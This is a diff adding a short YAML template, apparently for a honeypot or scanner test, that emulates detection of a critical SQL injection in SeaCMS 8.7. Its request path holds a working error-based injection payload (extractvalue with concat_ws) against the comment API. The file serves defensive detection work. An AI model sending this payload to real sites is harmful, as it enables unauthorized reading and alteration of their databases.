@@ -1,0 +1,27 @@
+id: seacms-sqli
+info:
+  name: SeaCMS 8.7 - SQL Injection
+  author: ritikchaddha
+  description: SeaCMS 8.7 contains a SQL injection vulnerability. An attacker can
+    possibly obtain sensitive information from a database, modify data, and execute
+    unauthorized administrative operations in the context of the affected site.
+  severity: critical
+  reference:
+  - https://www.uedbox.com/post/54561/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+  tags: seacms,sqli
+traps:
+- request:
+    method: GET
+    path: /comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5()))),@`%27`
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: '{{md5({{num}})}}'
